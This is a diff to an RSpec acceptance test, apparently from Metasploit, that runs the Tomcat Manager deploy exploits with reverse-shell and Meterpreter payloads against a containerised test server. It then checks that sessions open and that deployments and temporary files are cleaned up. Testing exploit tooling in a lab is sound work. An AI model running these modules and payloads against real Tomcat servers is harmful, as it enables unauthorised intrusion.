@@ -1,17 +1,38 @@
 require 'acceptance_spec_helper'
 require 'net/http'
+require 'timeout'
 
 RSpec.describe 'Tomcat Manager module targets' do
   include_context 'module target'
   include_context 'wait_for_expect'
 
-  java_spawn = Integer(ENV.fetch('TOMCAT_JAVA_SPAWN', '0'), 10)
-  raise ArgumentError, 'TOMCAT_JAVA_SPAWN must be 0 or 2' unless [0, 2].include?(java_spawn)
+  spawn_profile = ENV.fetch('TOMCAT_JAVA_SPAWN', '0')
+  java_spawn = spawn_profile == 'default' ? nil : Integer(spawn_profile, 10)
+  raise ArgumentError, 'TOMCAT_JAVA_SPAWN must be default, 0 or 2' unless [nil, 0, 2].include?(java_spawn)
+
+  java_spawn_description = java_spawn.nil? ? 'default Spawn=2' : "Spawn=#{java_spawn}"
+
+  before(:all) do
+    next unless java_spawn.nil?
+
+    expect(target_exec('tomcat', 'java', '-version')).to include('1.8.0_504-b01')
+    environment = target_exec('tomcat', 'cat', '/proc/1/environ').split("\0")
+    expect(environment.grep(/^JDK_JAVA_OPTIONS=/).length).to eq(1)
+    expect(environment.grep(/^JDK_JAVA_OPTIONS=/).first).to include('--add-opens=java.base/java.lang=ALL-UNNAMED')
+    expect(environment.grep(/^JAVA_TOOL_OPTIONS=/)).to be_empty
+    expect(target_exec('tomcat', 'sha256sum', '/usr/local/tomcat/bin/catalina.sh')).to start_with('39b5170cf75bf9019df1f5e38c86f5f9175e31fde71ab88c3273e455b4899d7e ')
+    # Read the actual packaged payload default without supplying Spawn to any
+    # exploit. Its generated configuration and SDK identity were checked natively.
+    defaults = console_command(%q{irb -e 'puts "MODULE_TARGET_JAVA_DEFAULT=" + framework.payloads.create("java/meterpreter/reverse_tcp").datastore["Spawn"].to_s; puts "MODULE_TARGET_JAVA_SDK=" + Digest::SHA256.hexdigest(MetasploitPayloads.read("java/metasploit/Payload.class"))'})
+    expect(defaults).to match(/^MODULE_TARGET_JAVA_DEFAULT=2$/)
+    expect(defaults).to match(/^MODULE_TARGET_JAVA_SDK=f2d768ccb588b5bb61d18769b04c2adcc92ec17ca00032808a1aad8235820c0b$/)
+  end
 
   before do
     response = manager_request('/manager/text/serverinfo')
     expect(response.code).to eq('200')
     expect(response.body).to include('Tomcat/9.0.123', 'OS Name: [Linux]')
+    expect(response.body).to include('JVM Version: [1.8.0_504-b01]') if java_spawn.nil?
     # Keep repeated preflights from locking the real fixture account in Tomcat's
     # default LockOutRealm; the individual negative cases still test its password.
     expect(manager_request('/manager/html', username: 'module-target-unknown-user', password: 'wrong-password').code).to eq('401')
@@ -60,6 +81,7 @@ RSpec.describe 'Tomcat Manager module targets' do
             'DisablePayloadHandler' => true, 'WfsDelay' => 0
           ))
           expect(output).not_to include('session opened')
+          expect(output).not_to match(/Failed to undeploy|Unable to access Tomcat Manager to undeploy|Undeployment failed|Deletion failed/)
           wait_for_expect(20, 0.1) do
             native = target_exec('tomcat', 'sh', '-c', "if test -f #{proof_path}; then echo executable-proof; fi")
             expect(native.strip).to eq('executable-proof')
@@ -73,11 +95,12 @@ RSpec.describe 'Tomcat Manager module targets' do
 
       targets = name == 'tomcat_mgr_deploy' ? [0, 1] : [0]
       targets.product(%w[java/jsp_shell_reverse_tcp java/meterpreter/reverse_tcp]).each do |target, payload|
-        payload_description = payload.include?('meterpreter') ? "#{payload} (Spawn=#{java_spawn})" : payload
+        payload_description = payload.include?('meterpreter') ? "#{payload} (#{java_spawn_description})" : payload
         it "opens #{payload_description} sessions twice with target #{target} and removes each deployment" do
           original_apps = deployed_apps
           original_files = deployment_files
-          payload_options = payload.include?('meterpreter') ? { 'Spawn' => java_spawn } : {}
+          original_java_temporary_files = java_temporary_files if java_spawn.nil?
+          payload_options = payload.include?('meterpreter') && !java_spawn.nil? ? { 'Spawn' => java_spawn } : {}
           2.times do
             proof_path = '/tmp/module-target-session-proof'
             target_exec('tomcat', 'rm', '-f', proof_path)
@@ -85,6 +108,7 @@ RSpec.describe 'Tomcat Manager module targets' do
             output = run_target_module(fullname, 'tomcat', options.merge(credentials).merge(payload_options).merge(
               'TARGET' => target, 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4444, 'WfsDelay' => 10, 'DisablePayloadHandler' => false
             ), action: 'run -z')
+            expect(output).not_to match(/Failed to undeploy|Unable to access Tomcat Manager to undeploy|Undeployment failed|Deletion failed/)
             session_id = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
             expect(session_id).not_to be_nil, output
             command = payload.include?('meterpreter') ? "execute -f /usr/bin/touch -a #{proof_path}" : "/usr/bin/touch #{proof_path}"
@@ -97,10 +121,18 @@ RSpec.describe 'Tomcat Manager module targets' do
             end
             # Kill the live JVM payload before the next run, then verify that the
             # Manager and the filesystem both agree undeployment completed.
-            console_command('sessions -K')
+            expect(console_command('sessions -K')).not_to match(/\[-\]|Exception|Unknown command/)
             target_exec('tomcat', 'rm', '-f', proof_path)
             expect(deployed_apps).to eq(original_apps)
             expect(deployment_files).to eq(original_files)
+            next unless java_spawn.nil?
+
+            Timeout.timeout(10) do
+              wait_for_expect(100, 0.1) do
+                expect(java_temporary_files).to eq(original_java_temporary_files)
+                expect(target_exec('tomcat', 'ps', '-ww', '-eo', 'args').lines.grep(/\bmetasploit\.Payload\b/)).to be_empty
+              end
+            end
           end
         end
       end
@@ -113,6 +145,10 @@ RSpec.describe 'Tomcat Manager module targets' do
 
   def temporary_files
     target_exec('tomcat', 'find', '/tmp', '-mindepth', '1', '-maxdepth', '1', '-type', 'f', '-printf', '%f\n').lines.sort
+  end
+
+  def java_temporary_files
+    target_exec('tomcat', 'find', '/usr/local/tomcat/temp', '-mindepth', '1', '-maxdepth', '1', '-printf', '%f\n').lines.sort
   end
 
   def deployed_apps
